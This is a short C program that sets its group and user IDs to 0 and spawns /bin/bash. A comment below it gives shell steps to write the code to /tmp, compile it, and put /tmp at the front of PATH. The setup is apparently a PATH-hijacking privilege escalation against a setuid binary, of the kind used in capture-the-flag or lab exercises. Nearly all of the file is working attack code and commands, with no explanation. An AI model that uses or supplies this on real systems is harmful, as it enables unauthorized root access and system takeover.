#include<stdio.h>
#include<stdlib.h>


int main(){
	
	setgid(0);
	setuid(0);
	system("/bin/bash");
	
	return 0;
}

/*

echo 'int main(){ setgid(0); setuid(0); system("/bin/bash"); return 0;}' > /tmp/example.c

* gcc /tmp/example.c -o /tmp/example

cd /tmp

export PATH=/tmp:$PATH
echo $PATH

*/
